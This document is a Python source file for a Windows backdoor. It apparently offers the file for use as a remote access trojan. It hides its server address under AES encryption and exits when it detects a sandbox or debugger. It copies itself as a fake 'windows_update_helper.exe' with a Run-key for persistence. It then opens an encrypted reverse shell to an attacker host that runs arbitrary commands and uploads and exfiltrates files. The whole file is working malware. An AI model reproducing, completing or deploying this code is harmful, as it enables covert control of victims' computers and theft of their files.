import os
import socket
import subprocess
import shutil
import sys
import time
import winreg
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# ====================== CONFIGURATION ======================
# AES-256 Encrypted configuration
ENCRYPTED_IP = b'\x9a\x12\xf7\x66\x3d\x90\x45\xd6\xe8\x73\xaa\x04\x39\xcf\x60\x95'  # Your IP
ENCRYPTION_KEY = hashlib.sha256(b'Thejester001').digest()  # Change this!
IV = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'  # Must match server

# ====================== UTILITIES ======================
def decrypt_data(encrypted_data):
    """Decrypt AES-256 CBC encrypted data"""
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(encrypted_data), AES.block_size).decode()

def encrypt_data(data):
    """Encrypt data with AES-256 CBC"""
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data, AES.block_size))

SERVER_IP = decrypt_data(ENCRYPTED_IP)  # Decrypts to 192.168.5.61
SERVER_PORT = 8080
CHUNK_SIZE = 8192

# ====================== SECURITY CHECKS ======================
def perform_security_checks():
    """Check for analysis environments"""
    try:
        # Check for sandbox
        if ctypes.windll.kernel32.GetModuleHandleW("SbieDll.dll"):
            sys.exit(0)
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
            
        # Check if running in temp locations
        temp_paths = ['temp', 'tmp', 'sandbox']
        if any(p in sys.argv[0].lower() for p in temp_paths):
            sys.exit(0)
            
    except:
        pass

# ====================== PERSISTENCE ======================
def establish_persistence():
    """Install with random filenames"""
    try:
        target_folder = os.path.join(os.environ['USERPROFILE'], 'Documents', 'SystemUtils')
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
            
        target_path = os.path.join(target_folder, 'windows_update_helper.exe')
        
        # Only copy if not already present
        if not os.path.exists(target_path):
            if getattr(sys, 'frozen', False):
                shutil.copy(sys.executable, target_path)
            else:
                # If running as script, compile first
                import py_compile
                py_compile.compile(sys.argv[0], target_path)
            
            # Registry persistence
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateHelper", 0, winreg.REG_SZ, target_path)
                
    except Exception as e:
        pass

# ====================== MAIN FUNCTIONALITY ======================
def secure_shell_session():
    """Main encrypted reverse shell loop"""
    current_dir = os.getcwd()
    
    while True:
        try:
            # Random delay between connection attempts
            time.sleep(30 + random.randint(0, 30))
            
            # Create and connect socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                # Receive encrypted command
                encrypted_cmd = sock.recv(1024)
                if not encrypted_cmd:
                    break
                    
                command = decrypt_data(encrypted_cmd)
                
                # Process commands
                if command.lower() == 'exit':
                    break
                    
                elif command.startswith('download'):
                    _, file_path = command.split(maxsplit=1)
                    try:
                        file_size = os.path.getsize(file_path)
                        sock.send(encrypt_data(f"SIZE {file_size}"))
                        with open(file_path, 'rb') as f:
                            while chunk := f.read(CHUNK_SIZE):
                                sock.send(chunk)
                    except Exception as e:
                        sock.send(encrypt_data(f"ERROR: {str(e)}"))
                        
                elif command.startswith('upload'):
                    _, file_path = command.split(maxsplit=1)
                    try:
                        with open(file_path, 'wb') as f:
                            while True:
                                chunk = sock.recv(CHUNK_SIZE)
                                if not chunk:
                                    break
                                f.write(chunk)
                        sock.send(encrypt_data("Upload complete"))
                    except Exception as e:
                        sock.send(encrypt_data(f"ERROR: {str(e)}"))
                        
                elif command.startswith('cd'):
                    try:
                        _, path = command.split(maxsplit=1)
                        new_dir = os.path.abspath(os.path.join(current_dir, path)) if path != ".." else os.path.dirname(current_dir)
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        sock.send(encrypt_data(f"Changed to: {current_dir}"))
                    except Exception as e:
                        sock.send(encrypt_data(f"ERROR: {str(e)}"))
                        
                else:  # Execute system command
                    try:
                        output = subprocess.check_output(
                            command, 
                            shell=True, 
                            stderr=subprocess.STDOUT, 
                            cwd=current_dir
                        )
                        sock.send(encrypt_data(output.decode()))
                    except subprocess.CalledProcessError as e:
                        sock.send(encrypt_data(f"ERROR: {str(e)}"))
            
            sock.close()
            
        except Exception as e:
            time.sleep(60)  # Longer delay on failure

# ====================== MAIN EXECUTION ======================
if __name__ == "__main__":
    # Initial security checks
    perform_security_checks()
    
    # Only persist if running from non-standard location
    if not sys.argv[0].lower().startswith(os.environ['USERPROFILE'].lower()):
        establish_persistence()
    
    # Start the shell session
    secure_shell_session()

